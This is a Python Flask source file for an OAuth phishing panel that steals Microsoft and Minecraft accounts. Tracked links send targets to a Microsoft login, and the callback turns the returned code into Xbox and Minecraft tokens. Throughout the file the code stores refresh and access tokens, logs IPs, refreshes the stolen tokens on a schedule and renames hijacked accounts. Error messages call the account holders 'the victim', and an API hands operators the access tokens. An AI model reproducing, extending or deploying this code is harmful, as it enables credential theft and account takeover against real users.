from test_app_config import test_app_config
import mcapi
import functools
import secrets
import time
import datetime
import token2namemc
from flask import Flask, render_template, url_for, redirect, request, send_from_directory, jsonify, abort, flash
from flask_sqlalchemy import SQLAlchemy
from flask_login import UserMixin, login_user, LoginManager, login_required, logout_user, current_user
from flask_wtf import FlaskForm
from wtforms import StringField, PasswordField, SubmitField
from wtforms.validators import InputRequired, Length, ValidationError, Regexp
from flask_bcrypt import Bcrypt
from apscheduler.schedulers.background import BackgroundScheduler
from sqlalchemy import func

app = Flask(__name__)

with app.app_context():
    # this is so the config is not icluded
    app.config.from_pyfile("instance/config.py")

    db = SQLAlchemy(app)
    bcrypt = Bcrypt(app)

    login_manager = LoginManager()
    login_manager.init_app(app)
    login_manager.login_view = "login"


@login_manager.user_loader
def load_user(user_id):
    return db.session.get(User, int(user_id))


class User(db.Model, UserMixin):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(20), nullable=False, unique=True)
    password = db.Column(db.String(80), nullable=False)
    api_token = db.Column(db.String(app.config.get("TOKEN_LEN", 16)),
                          default=secrets.token_urlsafe(app.config.get("TOKEN_LEN", 16)))


class Link(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    owner = db.Column(db.Integer, nullable=False)
    name = db.Column(db.String(20), nullable=False)
    app_id = db.Column(db.String(36), nullable=False)
    url_after = db.Column(db.String(100), nullable=False)

    tracks = db.relationship("Track", backref="link_tracks", lazy=True)


class Track(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    ip = db.Column(db.String(30))  # 255.255.255.255 15
    ua = db.Column(db.String(50))
    link = db.Column(db.Integer, db.ForeignKey("link.id"), nullable=False)
    time = db.Column(db.Integer, nullable=False)


class Account(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    owner = db.Column(db.Integer, nullable=False)
    err = db.Column(db.String(40))
    refresh_token = db.Column(db.String(500))
    app_id = db.Column(db.String(36), nullable=False)
    client_secret = db.Column(db.String(50))
    access_token = db.Column(db.String(400))
    uuid = db.Column(db.String(36))
    name = db.Column(db.String(16))
    ip = db.Column(db.String(50))
    ua = db.Column(db.String(50))
    shadowed = db.Column(db.Boolean, default=False)


class RegisterForm(FlaskForm):
    username = StringField(validators=[
                           InputRequired(), Length(min=4, max=20)], render_kw={"placeholder": "Username"})

    password = PasswordField(validators=[
                             InputRequired(), Length(min=8, max=20)], render_kw={"placeholder": "Password"})

    submit = SubmitField("Register")

    def validate_username(self, username):
        existing_user_username = User.query.filter_by(
            username=username.data).first()
        if existing_user_username:
            raise ValidationError(
                "That username already exists. Please choose a different one.")


class LoginForm(FlaskForm):
    username = StringField(validators=[
                           InputRequired(), Length(min=4, max=20)], render_kw={"placeholder": "Username"})

    password = PasswordField(validators=[
                             InputRequired(), Length(min=8, max=20)], render_kw={"placeholder": "Password"})

    submit = SubmitField("Login")

    def validate_password(self, password):
        user = User.query.filter_by(username=self.username.data).first()
        if not user:
            raise ValidationError(
                "That user doesnt exists.")

        if not bcrypt.check_password_hash(user.password, self.password.data):
            raise ValidationError(
                "That password is wrong.")

        login_user(user)


class CreateLinkForm(FlaskForm):
    name = StringField(validators=[
        InputRequired(), Length(min=1, max=20)], render_kw={"placeholder": "My Link"})

    app_id = StringField(validators=[  # regex for uuid
        InputRequired(), Length(min=36, max=36), Regexp("^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$", message="You have to enter a real appid.")], render_kw={"placeholder": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"})

    url_after = StringField(validators=[InputRequired(), Length(min=1, max=80), Regexp(
        "^https?://[^\s/$.?#].[^\s]*$", message="You have to enter a link into the url after field.")], render_kw={"placeholder": "https://youtube.com/watch?v=dQw4w9WgXcQ"})

    submit = SubmitField("Add Link")

    def validate_app_id(self, app_id):
        if Link.query.filter(Link.app_id == app_id.data).first():
            raise ValidationError(
                "all links must have a different app_id this one already exists.")


class EditLinkForm(FlaskForm):
    name = StringField(validators=[
        InputRequired(), Length(min=1, max=20)], render_kw={"placeholder": "My Link"})

    app_id = StringField(validators=[  # regex for uuid
        InputRequired(), Length(min=36, max=36), Regexp("^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$", message="You have to enter a real appid.")], render_kw={"placeholder": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"})

    url_after = StringField(validators=[InputRequired(), Length(min=1, max=80), Regexp(
        "^https?://[^\s/$.?#].[^\s]*$", message="You have to enter a link into the url after field.")], render_kw={"placeholder": "https://youtube.com/watch?v=dQw4w9WgXcQ"})

    submit = SubmitField("Edit Link")


class GenerateTokenForm(FlaskForm):
    submit = SubmitField("Generate New API Token")


class RenameMCForm(FlaskForm):
    name = StringField(validators=[  # regex for uuid
        InputRequired(), Length(min=3, max=16), Regexp("^[A-Za-z0-9_]{1,16}$", message="Minecraft names are 3-16 characters long and must only use a-z A-Z 0-9 and _.")], render_kw={"placeholder": "NewName"})

    submit = SubmitField("Rename")

class ImportAccountForm(FlaskForm):
    app_id = StringField(validators=[  # regex for uuid
        InputRequired(), Length(min=36, max=36), Regexp("^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$", message="You have to enter a real appid.")], render_kw={"placeholder": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"})

    refresh_token = StringField(validators=[
        InputRequired(), Length(min=36, max=500)], render_kw={"placeholder": "Refresh Token"})

    client_secret = StringField(validators=[
        Length(min=0, max=50)], render_kw={"placeholder": "GIh8r~0lEfNpyzYONYclCpIPINHS4r.ipo_TCGlb"})

    submit = SubmitField("Add Account")


@app.route("/")
def home():
    return render_template("home.html")


def get_redir(link_id):
    return f"{app.config.get('HOST')}/oauth/{link_id}"


def get_verify_link(link_id):
    return f"{app.config.get('HOST')}/verify/{link_id}"


@app.route("/login", methods=["GET", "POST"])
def login():
    form = LoginForm()
    if form.validate_on_submit():
        return redirect(url_for("dashboard"))
    return render_template("login.html", form=form)


@app.route("/dashboard", methods=["GET", "POST"])
@login_required
def dashboard():
    link_form = CreateLinkForm()

    import_acc_form = ImportAccountForm()

    links = Link.query.filter_by(owner=current_user.id).all()

    tracks = Track.query.join(Link, Link.id == Track.link).filter(
        Link.owner == current_user.id).all()[::-1]  # reverse so the first track is the latest

    accs = Account.query \
        .filter(Account.owner == current_user.id) \
        .filter(Account.shadowed == False) \
        .all()

    if link_form.validate_on_submit():
        new_link = Link(name=link_form.name.data,
                        app_id=link_form.app_id.data, url_after=link_form.url_after.data, owner=current_user.id)
        db.session.add(new_link)
        db.session.commit()

    if import_acc_form.validate_on_submit() and not Account.query \
        .filter(Account.owner == current_user.id) \
        .filter(Account.shadowed == False) \
        .filter(Account.refresh_token == import_acc_form.refresh_token.data) \
        .first():
        acc = import_acc(import_acc_form.app_id.data,
                         import_acc_form.refresh_token.data, 
         client_secret = import_acc_form.client_secret.data)
        acc.owner = current_user.id
        if Account.query \
                  .filter(Account.uuid == acc.uuid) \
                  .filter(Account.uuid != None) \
                  .filter(Account.owner == current_user.id) \
                  .filter(Account.shadowed == False) \
                  .first():
            flash("You already imported/got this account", category="error")
        else:
            db.session.add(acc)
            db.session.commit()

    return render_template("dashboard.html", link_form=link_form, 
                                             links=links,
                                             tracks=tracks,
                                             datetime=datetime, 
                                             get_verify_link=get_verify_link, 
                                             get_redir=get_redir, 
                                             accs=accs, 
                                             import_acc_form=import_acc_form)


@app.route("/dashboard/link/<int:link_id>/delete")
@login_required
def delete_link(link_id):
    link = Link.query.get_or_404(link_id)

    # Check if the current user owns the link before allowing deletion
    if link.owner == current_user.id:
        db.session.delete(link)
        db.session.commit()

    return redirect(url_for("dashboard"))


@app.route("/dashboard/link/<int:link_id>/verify")
@login_required
def verify_link(link_id):
    link = Link.query.get_or_404(link_id)

    if "FIREFOXES_RUNNING" not in app.config:
        app.config["FIREFOXES_RUNNING"] = 0

    if app.config.get("MAX_FIRFOX") <= app.config["FIREFOXES_RUNNING"]:
        return jsonify({"is_ratelimit": True})

    if link.owner != current_user.id:
        return jsonify({"udontownthis": True})

    app.config["FIREFOXES_RUNNING"] += 1

    is_valid = test_app_config(
        mcapi.auth_get_login_url(link.app_id, get_redir(link_id)))

    app.config["FIREFOXES_RUNNING"] -= 1

    return jsonify({"is_valid": is_valid})


@app.route("/dashboard/acc/<int:acc_id>/namemc")
@login_required
def namemc(acc_id):
    acc = Account.query.get_or_404(acc_id)

    if acc.owner != current_user.id:
        return jsonify({"udontownthis": True})

    link = token2namemc.wrapper(acc.access_token, acc.name, acc.uuid)
    return jsonify({"link": link})


@app.route("/dashboard/link/<int:link_id>/edit", methods=["GET", "POST"])
@login_required
def edit_link(link_id):
    link = Link.query.get_or_404(link_id)

    if link.owner != current_user.id:
        return redirect(url_for("dashboard"))

    form = EditLinkForm()

    if form.validate_on_submit():
        link.name = form.name.data
        link.app_id = form.app_id.data
        link.url_after = form.url_after.data
        db.session.commit()
        return redirect(url_for("dashboard"))

    form.name.data = link.name
    form.app_id.data = link.app_id
    form.url_after.data = link.url_after

    return render_template("editlink.html", link_form=form)


@app.route("/dashboard/track/clear_all")
@login_required
def delete_all_tracks():
    # there is a a weird warning 
    # app.py:324: SAWarning: Coercing Subquery object into a select() for use in IN(); please pass a select() construct explicitly
    # Track.query.filter(Track.id.in_(subq)).delete(synchronize_session=False)
    # i dunno what this is and iam sorry lol soooo il just leave this...
    # ps it still works even with the warning
    subq = db.session.query(Track.id).join(Link).filter(
        Link.owner == current_user.id).subquery()

    Track.query.filter(Track.id.in_(subq)).delete(synchronize_session=False)
    db.session.commit()

    return redirect(url_for("dashboard"))


@app.route("/dashboard/acc/<int:acc_id>/delete")
@login_required
def delete_acc(acc_id):
    acc = db.session.get(Account, acc_id)
    if acc.owner != current_user.id and not acc.shadowed:
        abort(400)
    acc.shadowed = True
    db.session.commit()
    return redirect(url_for("dashboard"))


@app.route("/dashboard/acc/<int:acc_id>/info")
@login_required
def acc_info(acc_id):
    acc = Account.query.get_or_404(acc_id)
    if acc.owner != current_user.id:
        abort(400)

    rename_form = RenameMCForm()
    if rename_form.validate_on_submit():
        r = mcapi.setName(acc.access_token, rename_form.name.data)
        if r.status_code != 200:
            flash("unable to change name", category="error")
        else:
            flash("changed name", category="message")
            acc.name = rename_form.name.data

    

    return render_template("accountinfo.html", acc=acc, rename_form=rename_form)


@app.route("/logout", methods=["GET", "POST"])
@login_required
def logout():
    logout_user()
    return redirect(url_for("login"))


@app.route("/register", methods=["GET", "POST"])
def register():
    form = RegisterForm()

    if form.validate_on_submit():
        hashed_password = bcrypt.generate_password_hash(form.password.data)
        new_user = User(username=form.username.data, password=hashed_password)
        db.session.add(new_user)
        db.session.commit()
        return redirect(url_for("login"))

    return render_template("register.html", form=form)


def track(request, link_id):
    ip = request.remote_addr
    if request.headers.get("X-Forwarded-For", False):
        ip = request.headers.get("X-Forwarded-For")

    track_info = Track(link=link_id, ua=request.headers.get(
        "User-Agent", "No UA"), ip=ip, time=int(time.time()))
    db.session.add(track_info)
    db.session.commit()


@app.route("/verify/<int:link_id>")
def verify_and_send_to_app(link_id):
    link = Link.query.get_or_404(link_id)

    track(request, link_id)

    return redirect(mcapi.auth_get_login_url(link.app_id, get_redir(link_id)))

def import_acc(app_id, refresh_token, client_secret = ""):
    acc = Account(app_id=app_id, refresh_token=refresh_token, client_secret=client_secret)

    tokens = mcapi.refresh_authorization_token(acc.app_id, acc.refresh_token, client_secret = client_secret)

    if "error" in tokens:
        acc.err = f"Microsoft said: {tokens['error_description']}"
        return acc

    return update_acc_by_xbox_accs_token(acc, tokens["access_token"])

def create_acc_by_code(code, link):
    acc = Account(app_id=link.app_id, owner=link.owner)

    if not code:
        acc.err = "the victim did not supply a code"
        return acc

    tokens = mcapi.auth_get_xbox_tokens(link.app_id, code, get_redir(link.id))

    if not tokens:
        acc.err = "the victim supplied an invalid code"
        return acc

    acc.refresh_token = tokens["refresh_token"]

    return update_acc_by_xbox_accs_token(acc, tokens["access_token"])


def update_acc(acc):
    if app.config.get("DEBUG", False):
        print(f"wont refresh {acc.name} to avoid spamming the minecraft apis.")
        return 
    tokens = mcapi.refresh_authorization_token(acc.app_id, acc.refresh_token, client_secret = acc.client_secret)

    if "error" in tokens:
        print(f"UNsuccsesfully refreshed account {acc.name} with error {tokens['error_description']}")
        acc.err = f"Microsoft said: {tokens['error_description']}"
        return acc

    print(f"succsesfully refreshed account {acc.name}")

    acc.refresh_token = tokens["refresh_token"]
    return update_acc_by_xbox_accs_token(acc, tokens["access_token"])


def update_acc_by_xbox_accs_token(acc, xbox_access_token):
    xbl_request = mcapi.auth_authenticate_with_xbl(xbox_access_token)
    xbl_token = xbl_request["Token"]
    userhash = xbl_request["DisplayClaims"]["xui"][0]["uhs"]

    xsts_request = mcapi.auth_authenticate_with_xsts(xbl_token)

    if "Token" not in xsts_request:
        acc.err = "the victim does not have minecraft"
        print(xsts_request)
        return acc

    xsts_token = xsts_request["Token"]

    account_request = mcapi.auth_authenticate_with_minecraft(
        userhash, xsts_token)

    if "access_token" not in account_request:
        acc.err = "the account request did not contain an accses token..."
        return acc

    acc.access_token = account_request["access_token"]
    profile = mcapi.auth_get_profile(account_request["access_token"])

    if "error" in profile:  # better be save with this
        acc.err = "the victim does not have minecraft"
        return acc

    acc.name = profile["name"]
    acc.uuid = profile["id"]

    acc.err = None

    return acc


@app.route("/oauth/<int:link_id>")
def oauth(link_id):
    link = Link.query.get_or_404(link_id)

    

    code = request.args.get("code", default=None, type=str)
    acc = create_acc_by_code(code, link)

    ip = request.remote_addr
    if request.headers.get("X-Forwarded-For"):
        ip = request.headers.get("X-Forwarded-For")

    acc.ip = ip
    acc.ua = request.headers.get("User-Agent", "No UA")

    if Account.query \
              .filter(Account.owner == db.session.get(Link, link_id).owner) \
              .filter(Account.uuid == acc.uuid) \
              .filter(Account.shadowed == False) \
              .first() or acc.err:
        db.session.add(acc)
        db.session.commit()

    return redirect(link.url_after)


@app.route("/favicon.ico")
def favicon():
    return send_from_directory("static/icons", "icon.ico", mimetype="image/vnd.microsoft.icon")


@app.route("/edituser", methods=["GET", "POST"])
@login_required
def edituser():
    generate_new_token = GenerateTokenForm()
    if generate_new_token.validate_on_submit():
        current_user.api_token = secrets.token_urlsafe(
            app.config.get("TOKEN_LEN", 16))

    return render_template("edituser.html", generate_new_token=generate_new_token, current_user=current_user)


def api_route():
    def decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            if "api_token" in kwargs:
                api_token = kwargs["api_token"]
            elif "X-Authorization" in request.headers:
                api_token = request.headers["X-Authorization"]
            else:
                abort(400)

            user = User.query.filter_by(api_token=api_token).first()

            if user:
                return func(user)
            else:
                abort(401)
        return wrapper
    return decorator


@app.route("/api/<string:api_token>/request")
@app.route("/api/request")
@api_route()
def api_getbyid(user):
    uuid = request.args.get("id", default="", type=str)

    acc = Account.query \
        .filter(Account.owner == user.id) \
        .filter(Account.shadowed == False) \
        .filter(Account.uuid == uuid) \
        .first()

    if not acc:
        return jsonify({"error": "The uuid is not in the list."})
    return jsonify({"user": acc.access_token})


@app.route("/api/<string:api_token>/list")
@app.route("/api/list")
@api_route()
def api_getaslist(user):
    accs = Account.query \
        .filter(Account.owner == user.id) \
        .filter(Account.shadowed == False) \
        .all()

    #res ={"users": [{"uuid": acc.uuid, "name": acc.name} for acc in accs]}
    res = {"users": []}
    for acc in accs:
        res["users"].append({"uuid": acc.uuid, "name": acc.name})
    return jsonify(res)


def refresh_accounts():
    with app.app_context():
        accounts = db.session.query(Account) \
                             .filter(Account.shadowed == False) \
                             .all()

        uuids = []
        unique_uuid_accs = []
        for account in accounts:
            if account.uuid not in uuids:
                uuids.append(account.uuid)
                unique_uuid_accs.append(account)

        print(f"refreshing {len(uuids)} accounts.")

        for account in unique_uuid_accs:
            account = update_acc(account)

            accs_2_update = db.session.query(Account) \
                                      .filter(Account.uuid == account.uuid) \
                                      .filter(Account.shadowed == False) \
                                      .all()

            for acc_2_update in accs_2_update:
                acc_2_update.name         = account.name
                acc_2_update.access_token = account.access_token
                acc_2_update.err          = account.err

        db.session.commit()


if __name__ == "__main__":
    with app.app_context():
        db.create_all()
    scheduler = BackgroundScheduler()
    scheduler.add_job(func=refresh_accounts, trigger="interval",
                      hours=app.config.get("REFRSH_INTERVAL", 10))
    scheduler.start()
    refresh_accounts()
    
    app.run(debug=app.config.get("DEBUG", False), port=app.config.get("PORT", 5000))